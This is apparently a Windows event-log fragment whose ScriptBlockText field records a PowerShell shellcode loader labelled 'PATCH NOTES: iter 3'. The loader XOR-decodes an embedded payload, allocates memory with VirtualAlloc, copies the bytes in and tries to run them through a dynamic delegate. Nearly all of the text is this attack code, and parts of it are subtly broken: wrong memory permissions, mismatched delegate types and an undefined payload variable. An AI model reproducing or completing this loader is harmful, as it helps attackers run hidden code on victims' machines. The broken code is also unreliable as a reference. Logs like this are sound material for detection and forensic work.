      <Data Name="ScriptBlockText">## PATCH NOTES: iter 3

function func_get_proc_address {
    param (
        [string]$ModuleName,
        [string]$FunctionName
    )
    $moduleHandle = Get-Process -Id $PID | Select-Object -ExpandProperty Modules | Where-Object { $_.FileName -like "*$ModuleName*" } | Select-Object -ExpandProperty BaseAddress
    return [IntPtr]::Add($moduleHandle, (Microsoft.Win32.UnsafeNativeMethods.GetProcAddress((Get-Process -Id $PID | Select-Object -ExpandProperty Modules | Where-Object { $_.FileName -like "*$Module*" } | Select-Object -ExpandProperty BaseAddress), $FunctionName)))
}

function Get-ProcAddress {
    param (
        [string]$Module,
        [string]$Function
    )
    return Microsoft.Win32.UnsafeNativeMethods.GetProcAddress((Get-Process -Id $PID | Select-Object -ExpandProperty Modules | Where-Object { $_.FileName -like "*$Module*" } | Select-Object -ExpandProperty BaseAddress), $Function)
}

function Deobfuscate-Shellcode {
    param (
        [byte[]]$EncodedShellcode
    )
    $deobfuscated = @()
    foreach ($byte in $EncodedShellcode) {
        $deobfuscated += $byte -bxor 35
    }
    return $deobfuscated
}

function Allocate-Memory {
    param (
        [int]$Size
    )
    $kernel32 = Get-ProcAddress -Module "kernel32.dll" -Function "VirtualAlloc"
    $allocFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($kernel32, ([Type][System.Action`1[[IntPtr]]]))
    return $allocFunc.Invoke([IntPtr]::Zero, $Size, 0x3000, 0x4)
}

function Copy-Shellcode {
    param (
        [byte[]]$Shellcode,
        [IntPtr]$MemoryAddress
    )
    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $MemoryAddress, $Shellcode.Length)
}

function Execute-Delegate {
    param (
        [IntPtr]$MemoryAddress
    )
    $delegateType = [System.Reflection.Emit.DynamicMethod]::new("Execute", [void], @(), [System.Type]::EmptyTypes)
    $ilGenerator = $delegateType.GetILGenerator()
    $ilGenerator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
    $ilGenerator.Emit([System.Reflection.Emit.OpCodes]::Calli, [System.Reflection.CallingConventions]::Any, [void], @(), $MemoryAddress)
    $ilGenerator.Emit([System.Reflection.Emit.OpCodes]::Ret)
    $delegate = $delegateType.CreateDelegate([System.Action])
    $delegate.DynamicInvoke()
}

function Run-Shellcode {
    param (
        [byte[]]$EncodedShellcode
    )
    $shellcode = Deobfuscate-Shellcode -EncodedShellcode $EncodedShellcode
    $memoryAddress = Allocate-Memory -Size $shellcode.Length
    Copy-Shellcode -Shellcode $shellcode -MemoryAddress $memoryAddress
    Execute-Delegate -MemoryAddress $memoryAddress
}

if ([IntPtr]::Size -eq 8) {
    # Run in 32-bit environment if on 64-bit system
    $job = Start-Job -ScriptBlock { param($shellcode) Run-Shellcode -EncodedShellcode $shellcode } -ArgumentList (Deobfuscate-Shellcode -EncodedShellcode $EncodedShellcode)
    Receive-Job -Job $job
} else {
    Run-Shellcode -EncodedShellcode $EncodedShellcode
}</Data>
